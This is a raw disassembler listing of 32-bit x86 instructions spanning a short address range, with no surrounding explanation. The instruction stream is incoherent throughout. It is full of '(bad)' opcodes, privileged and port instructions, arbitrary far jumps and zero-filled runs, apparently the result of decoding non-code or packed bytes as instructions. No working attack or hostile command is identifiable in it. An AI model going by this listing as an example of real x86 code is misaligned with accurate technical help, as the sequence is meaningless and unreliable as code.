  425fb8:	mov    ah,0xc5
  425fba:	sti    
  425fbb:	lock lock lock imul edx,DWORD PTR [ebp-0x7c217f59],0x9bc49718
  425fc8:	ret    0x89b9
  425fcb:	hlt    
  425fcc:	mov    WORD PTR [edi-0xb5ec47e],es
  425fd2:	or     dl,cl
  425fd4:	in     al,dx
  425fd5:	and    cl,BYTE PTR [ecx+0x44]
  425fd8:	inc    esi
  425fd9:	mov    edi,0x554f4395
  425fde:	rcr    eax,1
  425fe0:	stos   DWORD PTR es:[edi],eax
  425fe1:	dec    ecx
  425fe2:	lahf   
  425fe3:	adc    DWORD PTR [esi-0x60e66b70],ebp
  425fe9:	outs   dx,DWORD PTR ds:[esi]
  425fea:	loop   0x426036
  425fec:	lock mov DWORD PTR [edx],eax
  425fef:	xor    BYTE PTR [edx-0x63],dl
  425ff2:	mov    dl,0x3e
  425ff4:	cmp    ebp,edi
  425ff6:	dec    ebp
  425ff7:	sub    DWORD PTR [eax+ebx*2],ebx
  425ffa:	sbb    al,0x9f
  425ffc:	mov    edi,ebp
  425ffe:	lds    edi,FWORD PTR [edi+0x45]
  426001:	or     DWORD PTR [ecx],edi
  426003:	cmp    DWORD PTR [esi+eiz*1+0x3807739a],ecx
  42600a:	les    edx,FWORD PTR [esi]
  42600c:	out    dx,al
  42600d:	fst    st(4)
  42600f:	(bad)  
  426010:	xchg   edx,eax
  426011:	inc    edx
  426012:	mov    BYTE PTR [edi],dh
  426014:	adc    esp,DWORD PTR [eax-0x2d]
  426017:	pop    esp
  426018:	jle    0x425ffd
  42601a:	popa   
  42601b:	or     al,0xda
  42601d:	xchg   edi,eax
  42601e:	fstp   QWORD PTR [edx-0x4778f1f2]
  426024:	cmp    DWORD PTR ds:0x2ce3b1a8,0xffffffd9
  42602b:	inc    ebx
  42602c:	fcomp  st(6)
  42602e:	data16 into 
  426030:	and    ch,al
  426032:	mov    al,0x3f
  426034:	inc    edi
  426035:	push   ss
  426036:	in     eax,0xbb
  426038:	js     0x425ff6
  42603a:	cmc    
  42603b:	inc    esp
  42603c:	cli    
  42603d:	es jo  0x42606e
  426040:	aaa    
  426041:	out    dx,al
  426042:	lods   eax,DWORD PTR ds:[esi]
  426043:	push   edx
  426044:	adc    BYTE PTR [ecx-0x3c06659d],cl
  42604a:	jle    0x426037
  42604c:	in     al,dx
  42604d:	sub    DWORD PTR [edi],eax
  42604f:	mov    dl,0x3e
  426051:	pop    ebx
  426052:	pop    ebp
  426053:	xchg   BYTE PTR [eax],dh
  426055:	xchg   ebp,eax
  426056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426057:	mov    ebp,0xa95c3ba
  42605c:	cmp    DWORD PTR ds:0x56580ee9,ebx
  426062:	test   DWORD PTR [ecx],0x416d1f08
  426068:	sti    
  426069:	dec    ebp
  42606a:	(bad)  
  42606b:	mov    ds:0xf8,eax
	...
  4260d4:	add    BYTE PTR [eax],al
  4260d6:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	cdq    
  4260e3:	adc    ch,cl
  4260e5:	add    BYTE PTR [esi-0xfffe69],ah
  4260eb:	add    BYTE PTR [eax],al
  4260ed:	add    BYTE PTR ds:0x37726810,al
  4260f3:	inc    esp
  4260f4:	nop
  4260f5:	out    dx,al
  4260f6:	imul   ebp,ebp,0xffffffd7
  4260f9:	fst    DWORD PTR [esi+0xb]
  4260fc:	pop    ebx
  4260fd:	adc    ebx,esi
  4260ff:	(bad)
  426102:	pop    eax
  426103:	jbe    0x426095
  426105:	push   0x4e3b4fb7
  42610a:	daa    
  42610b:	lahf   
  42610c:	jno    0x4260bd
  42610e:	push   ebp
  42610f:	test   al,0x68
  426111:	sbb    al,0x96
  426113:	mov    edx,0x48a135f8
  426118:	stc    
  426119:	jns    0x4260ea
  42611b:	out    0x40,eax
  42611d:	push   edi
  42611e:	cmp    al,0x7b
  426120:	sub    DWORD PTR [ebx-0x622f35dd],0xffffffc6
  426127:	das    
  426128:	mov    ah,0xdf
  42612a:	mov    dl,0x83
  42612c:	js     0x4260cf
  42612e:	mov    ds:0x266c5c75,al
  426133:	dec    esp
  426134:	sbb    BYTE PTR [ecx+0x69040a59],0xa2
  42613b:	inc    eax
  42613c:	xchg   esi,eax
  42613d:	loope  0x4260c0
  42613f:	jmp    0x42617f
  426141:	leave  
  426142:	pop    ebp
  426143:	sbb    eax,0x894347bf
  426148:	aad    0xf4
  42614a:	lods   al,BYTE PTR ds:[esi]
  42614b:	xlat   BYTE PTR ds:[ebx]
  42614c:	jmp    0xff1:0x9f2e364
  426153:	jne    0x426155
  426155:	(bad)  
  426156:	and    dh,BYTE PTR [edi+0x54]
  426159:	adc    al,0x8c
  42615b:	jle    0x4261a5
  42615d:	and    esp,eax
  42615f:	cmp    bl,BYTE PTR [ebx+0x60]
  426162:	pop    ebp
  426163:	cmp    BYTE PTR [edx+ebx*8+0x41],0xa1
  426168:	sub    edi,DWORD PTR ds:[edx+eiz*1-0x63807007]
  426170:	pop    esi
  426171:	stc    
  426172:	adc    cl,BYTE PTR [ebp+0x3d]
  426175:	adc    DWORD PTR [ebx],0xfffffff7
  426178:	mov    ch,0xce
  42617a:	add    BYTE PTR [edi+0x29],bh
  42617d:	fild   WORD PTR [esi-0x70]
  426180:	pushf  
  426181:	dec    BYTE PTR [ebx-0x1b0357aa]
  426187:	mov    cr4,eax
  42618a:	arpl   WORD PTR [edi],si
  42618c:	leave  
  42618d:	push   cs
  42618e:	je     0x42612f
  426190:	jae    0x42619d
  426192:	in     eax,dx
  426193:	dec    esp
  426194:	cmp    DWORD PTR [ecx],ecx
  426196:	dec    ebx
  426197:	(bad)  
  426198:	jo     0x42613d
  42619a:	(bad)  
  42619b:	xor    DWORD PTR [eax],ebp
  42619d:	loope  0x42615e
  42619f:	pop    edx
  4261a0:	rcl    DWORD PTR [esi+0x88824a4],1
  4261a6:	ret    
  4261a7:	pop    edx
  4261a8:	call   0x5cf68863
  4261ad:	jae    0x426190
  4261af:	fiadd  WORD PTR [ecx+0x28]
  4261b2:	pop    eax
  4261b3:	js     0x426136
  4261b5:	add    DWORD PTR [ebp+ecx*2-0x73912d3e],ebx
  4261bc:	add    bl,BYTE PTR [edx]
  4261be:	xchg   edi,eax
  4261bf:	int3   
  4261c0:	xchg   edi,eax
  4261c1:	aaa    
  4261c2:	test   BYTE PTR [ecx],bh
  4261c4:	test   dh,dl
  4261c6:	ins    DWORD PTR es:[edi],dx
  4261c7:	mov    edx,0x83264fc0
  4261cc:	xchg   ebx,eax
  4261cd:	sbb    al,cl
  4261cf:	daa    
  4261d0:	xchg   edx,eax
  4261d1:	adc    BYTE PTR [ebx+0x4ce6b420],bl
  4261d7:	pop    ecx
  4261d8:	jb     0x426200
  4261da:	std    
  4261db:	sti    
  4261dc:	ret    0xf361
  4261df:	push   edi
  4261e0:	popf   
  4261e1:	and    edx,edi
  4261e3:	fstp   DWORD PTR [eax]
  4261e5:	inc    ecx
  4261e6:	jns    0x42624c
  4261e8:	sub    eax,0x2125d9aa
	...
  426255:	add    BYTE PTR [ebx-0x409ef0df],bl
  42625b:	outs   dx,DWORD PTR ds:[esi]
  42625c:	(bad)  
  42625d:	sti    
  42625e:	mov    bh,0x83
  426260:	mov    cl,0x27
  426262:	out    0x5b,al
  426264:	outs   dx,BYTE PTR ds:[esi]
  426265:	(bad)  
  426266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426267:	cwde   
  426268:	add    DWORD PTR [eax],eax
  42626a:	inc    DWORD PTR [eax]
  42626c:	add    BYTE PTR [eax],al
  42626e:	jne    0x4262df
  426270:	inc    eax
  426271:	adc    ch,BYTE PTR [ecx+0x45]
  426274:	pusha  
  426275:	push   edi
  426276:	jecxz  0x426270
  426278:	inc    eax
  426279:	xchg   edx,eax
  42627a:	loop   0x4262f4
  42627c:	pop    eax
  42627d:	ins    DWORD PTR es:[edi],dx
  42627e:	mov    edi,0x572160d9
  426283:	xchg   edx,eax
  426284:	shl    DWORD PTR [ebx-0x7c],0x5b
  426288:	sbb    ch,BYTE PTR [ebx]
  42628a:	rcr    DWORD PTR [ebp+0x32],1
  42628d:	jl     0x426233
  42628f:	mov    edi,0xb29b072c
  426294:	or     BYTE PTR [ebx+edi*1+0x21cb2c53],0xe
  42629c:	lahf   
  42629d:	cmc    
  42629e:	inc    ecx
  42629f:	test   DWORD PTR [ecx],ebp
  4262a1:	out    dx,al
  4262a2:	push   esp
  4262a3:	mov    BYTE PTR [ebx+0x49],ah
  4262a6:	sbb    DWORD PTR es:[ecx],edi
  4262a9:	jg     0x4262fe
  4262ab:	and    DWORD PTR [ecx],ebp
  4262ad:	in     eax,0x7d
  4262af:	jmp    0x97e2:0x8e09fcae
  4262b6:	je     0x4262b7
  4262b8:	sbb    eax,0xb76a816e
  4262bd:	xchg   ebp,eax
  4262be:	(bad)  
  4262bf:	or     eax,0x50aacf67
  4262c4:	icebp  
  4262c5:	jae    0x426291
  4262c7:	iret   
  4262c8:	mov    ecx,0xc8acd8af
  4262cd:	hlt    
  4262ce:	nop
  4262cf:	and    ecx,eax
  4262d1:	jns    0x42629e
  4262d3:	dec    ebp
  4262d4:	addr16 xchg ecx,eax
  4262d6:	pop    edi
  4262d7:	sub    DWORD PTR [esi-0x4a],esi
  4262da:	xor    eax,0x2c339c19
  4262df:	lea    eax,[ebx-0x10]
  4262e2:	xchg   edx,eax
  4262e3:	test   DWORD PTR [ecx],esi
  4262e5:	or     BYTE PTR [eax-0x3fa2dcf7],dh
  4262eb:	mov    al,0xd
  4262ed:	jbe    0x426321
  4262ef:	fadd   DWORD PTR [edi]
  4262f1:	dec    edi
  4262f2:	xchg   ebp,eax
  4262f3:	cmp    al,0xea
  4262f5:	cmc    
  4262f6:	cs jb  0x4262ef
  4262f9:	adc    esi,DWORD PTR [esi-0x7193c882]
  4262ff:	mov    al,ds:0x44c70099
  426304:	out    0x6f,al
  426306:	xor    DWORD PTR [esi+0x6a90de7d],esi
  42630c:	adc    eax,DWORD PTR [ecx]
  42630e:	add    DWORD PTR ds:0x9347a879,ecx
  426314:	(bad)  
  426316:	int    0xc
  426318:	adc    DWORD PTR [ebx-0x61],edx
  42631b:	ins    DWORD PTR es:[edi],dx
  42631c:	pop    ebx
  42631d:	jl     0x426385
  42631f:	ss pop ebx
  426321:	lock sahf 
  426323:	jmp    0x6c936e0e
  426328:	dec    eax
  426329:	rol    BYTE PTR [esi],0xb2
  42632c:	stc    
  42632d:	dec    BYTE PTR [ebx-0x2b6d0594]
  426333:	sbb    eax,0xef3c0d09
  426338:	imul   esp,DWORD PTR [ebp-0x5a],0xc9444d21
  42633f:	or     al,0xb3
  426341:	inc    ebx
  426342:	je     0x4263b7
  426344:	sar    DWORD PTR [eax+edx*1+0x3a],cl
  426348:	xor    BYTE PTR [ebp-0x25d1ec4f],ch
  42634e:	mov    dl,BYTE PTR [ebx-0x62]
  426351:	imul   DWORD PTR [edi]
  426353:	or     cl,BYTE PTR [ecx+0x393aea88]
  426359:	jmp    DWORD PTR [esi]
  42635b:	add    eax,0x95d46876
  426360:	xchg   edx,eax
  426361:	sub    eax,0xddb2a15c
  426366:	xor    dl,BYTE PTR [edi-0x10]
  426369:	outs   dx,BYTE PTR ds:[esi]
  42636a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42636b:	xor    eax,0x57
	...
  4263d4:	add    BYTE PTR [eax],al
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x9a0bdd6e
  4263e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e7:	cdq    
  4263e8:	add    DWORD PTR [eax],eax
  4263ea:	inc    DWORD PTR [eax]
  4263ec:	add    BYTE PTR [eax],al
  4263ee:	mov    ah,0x11
  4263f0:	ret    0xda92
  4263f3:	mov    dl,0x95
  4263f5:	mov    eax,0x6ea12c80
  4263fa:	pushf  
  4263fb:	mov    ds,WORD PTR [eax+0x3e897cd8]
  426401:	xor    al,0x63
  426403:	mov    eax,ds:0x48203832
  426408:	(bad)  
  426409:	jnp    0x4263af
  42640b:	jmp    0x149b:0x1c435677
  426412:	loope  0x4263d0
  426414:	pop    DWORD PTR [eax+eax*4+0x20]
  426418:	enter  0x13d2,0x51
  42641c:	pop    ebx
  42641d:	jp     0x426412
  42641f:	in     al,dx
  426420:	enter  0x5015,0xc5
  426424:	jmp    0xf890:0x1eaf1164
  42642b:	adc    BYTE PTR [ebx-0x5b3ccc8a],ah
  426431:	repz cmp DWORD PTR [edi+0x4809d364],edi
  426438:	retf   
  426439:	outs   dx,DWORD PTR ds:[esi]
  42643a:	repz mov ah,0x85
  42643d:	sbb    eax,0xf5c56f7d
  426442:	imul   esi,ecx,0xffffffa9
  426445:	sbb    eax,DWORD PTR [eax-0x54]
  426448:	sbb    al,0x80
  42644a:	pop    ebx
  42644b:	(bad)  
  42644c:	imul   eax,DWORD PTR [edx+0x68],0x36f71e44
  426453:	mov    bh,0x83
  426455:	mov    bl,0xd0
  426457:	stos   DWORD PTR es:[edi],eax
  426458:	mov    BYTE PTR [eax+0x70],0xa7
  42645c:	jno    0x4264d3
  42645e:	pop    edx
  42645f:	jno    0x42643f
  426461:	repz adc ch,BYTE PTR [edx+0x71]
  426465:	loop   0x4264b5
  426467:	mov    dl,0xbc
  426469:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42646b:	(bad)  
  42646d:	dec    edx
  42646e:	push   ebp
  42646f:	add    DWORD PTR [edx-0x25],ebx
  426472:	jge    0x4264cb
  426474:	(bad)  
  426475:	je     0x4264e3
  426477:	jl     0x42640e
  426479:	or     edi,ecx
  42647b:	mov    dl,0x17
  42647d:	mov    ecx,0x2d400125
  426482:	mov    dh,0x40
  426484:	dec    ebx
  426485:	add    dh,ah
  426487:	pop    ss
  426488:	jmp    0x42642d
  42648a:	jnp    0x426475
  42648c:	mov    ebx,0x20049a45
  426491:	hlt    
  426492:	icebp  
  426493:	or     cl,ah
  426495:	cmp    bh,BYTE PTR [edx+0x2d]
  426498:	repnz push esi
  42649a:	shr    BYTE PTR [edi+0x4af397f6],cl
  4264a0:	into   
  4264a1:	les    edi,FWORD PTR [ebx+0x4b]
  4264a4:	add    ebx,eax
  4264a6:	cmp    BYTE PTR [eax+0x21],dh
  4264a9:	rcl    al,1
  4264ab:	mov    ss,ebx
  4264ad:	sub    al,0x43
  4264af:	test   cl,bl
  4264b1:	cmp    edi,DWORD PTR [ecx+0x33]
  4264b4:	outs   dx,DWORD PTR ds:[esi]
  4264b5:	add    ah,dh
  4264b7:	sbb    eax,0xc797bf34
  4264bc:	or     al,0xa4
  4264be:	das    
  4264bf:	inc    esi
  4264c0:	inc    ebp
  4264c1:	repnz fneni(8087 only) 
  4264c4:	push   esp
  4264c5:	adc    al,0x49
  4264c7:	jnp    0x42651c
  4264c9:	ret    
  4264ca:	cmp    eax,esp
  4264cc:	mov    bh,0xc0
  4264ce:	in     al,dx
  4264cf:	mov    dl,0xcd
  4264d1:	addr16 and al,0xe5
  4264d4:	loopne 0x426471
  4264d6:	ror    BYTE PTR [ecx],0xcb
  4264d9:	imul   edi,DWORD PTR [ebp+0x2efc174c],0x6f
  4264e0:	xchg   edi,eax
  4264e1:	mov    ah,0xaa
  4264e3:	add    BYTE PTR [ebx+ebp*4-0x4dc68b47],0xa1
  4264eb:	add    al,al
	...
  426555:	add    BYTE PTR [ecx+0x6f],ch
  426558:	mov    BYTE PTR [eax],cl
  42655a:	mov    gs,edi
  42655c:	jmp    0x8abb74d0
  426561:	test   DWORD PTR [ebx-0x5cafafc5],ebx
  426567:	call   0x0:0xff0001
  42656e:	daa    
  42656f:	retf   
  426570:	retf   
  426571:	inc    ecx
  426572:	lahf   
  426573:	std    
  426574:	ss push esi
  426576:	or     dl,dl
  426578:	sbb    ebp,esi
  42657a:	adc    DWORD PTR [esi-0x27],0x7b
  42657e:	retf   0x3042
  426581:	daa    
  426582:	mov    eax,0x9d202c3f
  426587:	movaps XMMWORD PTR [edi+0x7b9a9b9],xmm5
  42658e:	(bad)  [ebx-0x4f]
  426591:	(bad)  
  426592:	sti    
  426593:	aaa    
  426594:	cdq    
  426595:	popa   
  426596:	mov    edi,0x259ca398
  42659b:	jl     0x4265d5
  42659d:	pop    edi
  42659e:	test   ch,ch
  4265a0:	je     0x42661d
  4265a2:	stos   BYTE PTR es:[edi],al
  4265a3:	neg    ah
  4265a5:	add    eax,0xcf7d6805
  4265aa:	sahf   
  4265ab:	cmp    al,0xf2
  4265ad:	sbb    edx,ebp
  4265af:	jge    0x4265fd
  4265b1:	in     eax,dx
  4265b2:	loop   0x4265ea
  4265b4:	adc    ah,BYTE PTR ds:0x3a22f3a1
  4265ba:	scas   eax,DWORD PTR es:[edi]
  4265bb:	not    BYTE PTR [eax]
  4265bd:	sar    BYTE PTR [esi+0x3652c41c],1
  4265c3:	xchg   ecx,eax
  4265c4:	pop    es
  4265c5:	xchg   ebx,eax
  4265c6:	aam    0x7e
  4265c8:	aas    
  4265c9:	jne    0x4265ff
  4265cb:	dec    eax
  4265cc:	mov    WORD PTR [ebx-0x62],ss
  4265cf:	mul    bl
  4265d1:	lds    eax,FWORD PTR [edi-0x7ccaeddd]
  4265d7:	mov    ecx,0x273f1964
  4265dc:	js     0x4265e9
  4265de:	pop    edi
  4265df:	in     eax,0x16
  4265e1:	sub    eax,0x317cb4bc
  4265e6:	cwde   
  4265e7:	jne    0x426619
  4265e9:	sti    
  4265ea:	mov    ch,0x8
  4265ec:	dec    ebx
  4265ed:	dec    ebp
  4265ee:	mov    bh,0xbe
  4265f0:	mov    dh,0xa2
  4265f2:	mov    edx,esp
  4265f4:	jae    0x426664
  4265f6:	jnp    0x426626
  4265f8:	in     al,dx
  4265f9:	rcl    DWORD PTR [esi+0x1a],1
  4265fc:	bound  eax,QWORD PTR [esi+0x79]
  4265ff:	sbb    eax,DWORD PTR [ecx]
  426601:	in     eax,0x64
  426603:	or     bh,BYTE PTR [esi-0x28]
  426606:	cli    
  426607:	xor    DWORD PTR [ecx],ecx
  426609:	in     eax,dx
  42660a:	mov    al,0x9
  42660c:	repz cmc 
  42660e:	mov    edx,0xf48ce3e3
  426613:	ja     0x42663f
  426615:	adc    al,0x8
  426617:	fadd   QWORD PTR [esp+edi*4-0x674a7d08]
  42661e:	cmp    BYTE PTR [edi-0x65],dh
  426621:	push   esp
  426622:	sub    al,0xed
  426624:	arpl   bp,si
  426626:	adc    DWORD PTR [eax],eax
  426628:	adc    al,0x65
  42662a:	add    BYTE PTR [esi+0x8],bl
  42662d:	add    ch,BYTE PTR [ebx-0x5c]
  426630:	sub    BYTE PTR [ebp+0x17],cl
  426633:	pushf  
  426634:	push   ecx
  426635:	or     esi,DWORD PTR [edx-0x9]
  426638:	aaa    
  426639:	or     BYTE PTR [ebx-0x6c],ah
  42663c:	dec    BYTE PTR fs:[eax]
  42663f:	pop    ecx
  426640:	xlat   BYTE PTR ds:[ebx]
  426641:	mov    BYTE PTR [edi],bl
  426643:	stos   BYTE PTR es:[edi],al
  426644:	push   ds
  426645:	adc    BYTE PTR [ebp-0x1ace7114],dh
  42664b:	fmulp  st(7),st
  42664d:	ins    BYTE PTR es:[edi],dx
  42664e:	cmp    DWORD PTR [edx+0x31d4986e],0xffffffaa
  426655:	pop    esi
  426656:	psrlw  mm1,QWORD PTR [ebx-0x4fb08e0e]
  42665d:	xchg   BYTE PTR [ecx-0x4222fcd8],ch
  426663:	inc    eax
  426664:	cli    
  426665:	push   0x21
  426667:	jp     0x4265eb
  426669:	(bad)  
  42666a:	(bad)  ds:0xd0
	...
  4266d4:	add    BYTE PTR [eax],al
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi+0x2f7c6da4]
  4266e4:	push   edi
  4266e5:	icebp  
  4266e6:	mov    ds:0xff00019b,al
  4266eb:	add    BYTE PTR [eax],al
  4266ed:	add    BYTE PTR [eax+esi*1],cl
  4266f0:	ror    ch,1
  4266f2:	pop    ebp
  4266f3:	stos   BYTE PTR es:[edi],al
  4266f4:	or     BYTE PTR [edx-0x5b],dl
  4266f7:	imul   edi,DWORD PTR [ebx+edx*8+0x64ff238d],0xabdc1e46
  426702:	jne    0x4266d4
  426704:	sub    al,0x43
  426706:	xor    al,BYTE PTR [edi-0x75]
  426709:	cmp    al,0x17
  42670b:	call   0xaf80:0x6761e823
  426712:	cmp    dh,cl
  426714:	test   al,0xd1
  426716:	mov    dh,0x32
  426718:	into   
  426719:	aad    0xb7
  42671b:	mov    eax,0xbc8a9b76
  426720:	popf   
  426721:	push   esp
  426722:	clc    
  426723:	add    ah,dh
  426725:	xchg   esi,eax
  426726:	lds    edx,FWORD PTR [edi]
  426728:	bound  edi,QWORD PTR [esi+0x2a64826c]
  42672e:	inc    edi
  42672f:	retf   
  426730:	mov    edi,0xdae74a9f
  426735:	push   ebp
  426736:	repz stc 
  426738:	iret   
  426739:	mov    dh,0x7a
  42673b:	lods   eax,DWORD PTR ds:[esi]
  42673c:	adc    eax,0xf53934bd
  426741:	jo     0x4266f4
  426743:	gs out 0xb6,al
  426746:	jnp    0x426763
  426748:	ins    DWORD PTR es:[edi],dx
  426749:	leave  
  42674a:	repnz clc 
  42674c:	adc    BYTE PTR [ecx+0x586e46c0],ch
  426752:	or     ecx,DWORD PTR [edx+esi*2]
  426755:	or     BYTE PTR [edi-0x4866dfa6],ch
  42675b:	mov    edi,0x90d6996f
  426760:	inc    ebx
  426761:	and    edx,eax
  426763:	mov    ch,0x34
  426765:	mov    bl,BYTE PTR ds:0xae63bf72
  42676b:	jecxz  0x4267ba
  42676d:	pop    edx
  42676e:	pushf  
  42676f:	add    eax,0xaacb1ade
  426774:	dec    edx
  426775:	data16 mov WORD PTR ds:0x3d06b919,ds
  42677c:	dec    ecx
  42677d:	imul   DWORD PTR [ecx-0x64]
  426780:	add    al,0x74
  426782:	sar    BYTE PTR [ecx],0x8a
  426785:	cmp    DWORD PTR [ecx],edx
  426787:	jl     0x426745
  426789:	dec    ebx
  42678a:	pop    ds
  42678b:	out    dx,al
  42678c:	inc    edi
  42678d:	sti    
  42678e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42678f:	out    dx,eax
  426790:	clc    
  426791:	jns    0x42678a
  426793:	inc    edx
  426794:	retf   0x93ff
  426797:	sbb    eax,0x59b6f0a8
  42679c:	mov    ebx,0x31127ad1
  4267a1:	retf   0x53ae
  4267a4:	jbe    0x42672c
  4267a6:	or     eax,0x30ddd660
  4267ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267ac:	in     eax,dx
  4267ad:	enter  0x9015,0xd2
  4267b1:	cmp    al,0x3c
  4267b3:	add    BYTE PTR [ecx-0x34],ch
  4267b6:	int3   
  4267b7:	jge    0x42681e
  4267b9:	jp     0x42678b
  4267bb:	daa    
  4267bc:	arpl   WORD PTR [esi+edx*8],si
  4267bf:	mov    WORD PTR [ecx-0xe473ae2],es
  4267c5:	adc    eax,esi
  4267c7:	(bad)  [edi+0x24]
  4267ca:	nop
  4267cb:	in     al,0x6c
  4267cd:	xor    ecx,edi
  4267cf:	mov    ah,0x44
  4267d1:	std    
  4267d2:	xor    DWORD PTR [edx-0x18e16232],eax
  4267d8:	xlat   BYTE PTR ds:[ebx]
  4267d9:	cmpps  xmm2,xmm2,0xf8
  4267dd:	shr    BYTE PTR [eax-0x43292750],0xf7
  4267e4:	nop
  4267e5:	add    ah,BYTE PTR [esi]
  4267e7:	enter  0x6a49,0xb6
  4267eb:	mov    DWORD PTR [eax+eax*1+0x0],ebp
	...
  426856:	mov    eax,0xff2ace8d
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	arpl   WORD PTR [edx],ax
  426864:	fnstsw WORD PTR [ebp+0x19ca1]
  42686a:	inc    DWORD PTR [eax]
  42686c:	add    BYTE PTR [eax],al
  42686e:	sbb    al,0xde
  426870:	xchg   edx,edx
  426872:	(bad)  
  426873:	adc    eax,0xc86cf46
  426878:	xor    DWORD PTR [esi-0x1e6412d6],0x6539cc61
  426882:	mov    cs,WORD PTR [esi+0x64]
  426885:	rol    dh,0x5c
  426888:	lock jmp 0x2afc:0xe6da4f67
  426890:	imul   ebx,DWORD PTR [eax],0x43872024
  426896:	call   FWORD PTR [edi]
  426898:	retf   0x562f
  42689b:	or     ecx,ebp
  42689d:	mov    ds:0x795678c1,eax
  4268a2:	popf   
  4268a3:	mov    al,ds:0xedc1177a
  4268a8:	lock imul esi,DWORD PTR [ebx+0x3b6e75dd],0xffffffd1
  4268b0:	or     DWORD PTR [edi+edi*4-0x5d83a3d6],0xafd9cff0
  4268bb:	hlt    
  4268bc:	lock push esp
  4268be:	inc    esi
  4268bf:	cmp    edx,ebp
  4268c1:	add    DWORD PTR [edx-0x12],esi
  4268c4:	fadd   DWORD PTR ds:0x79fb14db
  4268ca:	lods   eax,DWORD PTR ds:[esi]
  4268cb:	mov    al,0x35
  4268cd:	arpl   WORD PTR [esi+edx*1-0x54298746],dx
  4268d4:	stc    
  4268d5:	push   cs
  4268d6:	add    ch,al
  4268d8:	or     ch,dl
  4268da:	push   ebx
  4268db:	jns    0x4268b5
  4268dd:	clts   
  4268df:	enter  0x2089,0x5c
  4268e3:	xchg   DWORD PTR [ebp-0xdc4567c],ebx
  4268e9:	inc    esp
  4268ea:	es nop
  4268ec:	xor    eax,0x30efc264
  4268f1:	cli    
  4268f2:	lds    sp,DWORD PTR [edi]
  4268f5:	out    0xaa,eax
  4268f7:	arpl   sp,sp
  4268f9:	mov    ch,0x8c
  4268fb:	sbb    BYTE PTR [ebx-0x3c08d854],bl
  426901:	pop    esp
  426902:	and    al,0x62
  426904:	dec    ebp
  426905:	mov    dl,BYTE PTR [eax-0x115eee8]
  42690b:	lea    edx,[ecx-0x62]
  42690e:	sub    dh,BYTE PTR [ecx]
  426910:	jnp    0x4268a0
  426912:	(bad)  
  426913:	cwde   
  426914:	jae    0x4268ac
  426916:	cmp    al,0xe6
  426918:	sti    
  426919:	(bad)  
  42691a:	xor    ebp,ebx
  42691c:	add    al,0x85
  42691e:	push   esp
  42691f:	mov    edi,cs
  426921:	sub    DWORD PTR [eax+0x28],edi
  426924:	fisttp QWORD PTR [ecx]
  426926:	pop    es
  426927:	dec    esi
  426928:	or     eax,DWORD PTR [edi-0x51]
  42692b:	pop    ss
  42692c:	shl    DWORD PTR [ecx+0x52],cl
  42692f:	ins    DWORD PTR es:[edi],dx
  426930:	fwait
  426931:	add    al,0xf6
  426933:	(bad)  
  426934:	pop    ecx
  426935:	mov    al,0x44
  426937:	fs loopne 0x426995
  42693a:	pop    ds
  42693b:	lea    esi,[eax+ebp*2-0x6429f50]
  426942:	cmp    dl,BYTE PTR [ecx]
  426944:	stos   BYTE PTR es:[edi],al
  426945:	add    BYTE PTR [ebp-0x32f80b24],cl
  42694b:	adc    al,0x5d
  42694d:	rol    DWORD PTR [ecx+0x7b],0xb
  426951:	sub    al,0xeb
  426953:	pop    es
  426954:	mov    ebp,0xd35294d7
  426959:	jb     0x426956
  42695b:	ret    0xcd8a
  42695e:	inc    ebx
  42695f:	in     eax,0x9d
  426961:	xlat   BYTE PTR ds:[ebx]
  426962:	(bad)  
  426963:	stc    
  426964:	xchg   edx,eax
  426965:	lods   al,BYTE PTR ds:[esi]
  426966:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426967:	mov    dl,0x11
  426969:	push   0xaf2838
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    esp,edx
  4269e3:	iret   
  4269e4:	retf   
  4269e5:	clc    
  4269e6:	mov    al,ds:0xff00019d
  4269eb:	add    BYTE PTR [eax],al
  4269ed:	add    bl,al
  4269ef:	mov    esp,0x47f6bc8f
  4269f4:	stos   DWORD PTR es:[edi],eax
  4269f5:	ss mov edi,0x965dc41a
  4269fb:	pop    edi
  4269fc:	rcl    DWORD PTR [edi-0xe],cl
  4269ff:	in     al,dx
  426a00:	in     eax,0xa9
  426a02:	mov    WORD PTR [esp+edi*1+0x62a9d76a],fs
  426a09:	adc    al,0x24
  426a0b:	or     ebx,DWORD PTR [ebx-0x6e7b7a99]
  426a11:	data16 fidiv WORD PTR [edx+esi*4+0x4bd13dd7]
  426a19:	inc    edx
  426a1a:	fdivr  DWORD PTR [edx]
  426a1c:	pop    ebp
  426a1d:	pusha  
  426a1e:	pop    ebp
  426a1f:	jns    0x426a14
  426a21:	popf   
  426a22:	pushf  
  426a23:	pop    esi
  426a24:	ret    0x701b
  426a27:	fbld   TBYTE PTR [esi]
  426a29:	int    0x57
  426a2b:	xchg   edx,eax
  426a2c:	and    ch,BYTE PTR [ebp+0xa13e460]
  426a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a33:	je     0x4269f0
  426a35:	fstp   DWORD PTR [esi]
  426a37:	push   es
  426a38:	test   DWORD PTR [esi+esi*2+0x49260610],edx
  426a3f:	dec    esp
  426a40:	adc    DWORD PTR [edi+esi*8],ecx
  426a43:	dec    ecx
  426a44:	xchg   esp,eax
  426a45:	dec    ebx
  426a46:	(bad)  
  426a48:	or     al,BYTE PTR [esi+0x1ca26138]
